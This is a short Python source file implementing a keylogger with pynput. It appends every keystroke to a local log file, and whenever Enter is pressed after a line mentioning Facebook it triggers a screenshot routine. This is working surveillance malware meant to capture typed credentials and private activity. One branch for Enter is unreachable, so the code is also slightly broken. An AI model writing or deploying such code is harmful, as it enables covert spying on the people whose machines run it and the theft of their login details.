from pynput import keyboard
import os
import take_screenshot


def on_press(key):
    try:
        current = str(key.char)
    except AttributeError:
        current = str(key)
    if not current.isalnum():
        current = ""
    if key == keyboard.Key.space:
        current = " "
    if key == keyboard.Key.enter:
        import take_screenshot
        with open("log.txt") as f:
            last_line = ""
            for line in f:
                last_line = line
            if "facebook" in last_line.lower():
                take_screenshot.takeSS()
    elif key == keyboard.Key.enter:
        current = "\n"
    elif key == keyboard.Key.backspace:
        with open("log.txt", "rb+") as f:
            f.seek(-1, os.SEEK_END)
            f.truncate()
    with open("log.txt", "a") as f:
        f.write(current)

def on_release(key):
    if key == keyboard.Key.esc:
        return False



def keylogger_start():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()








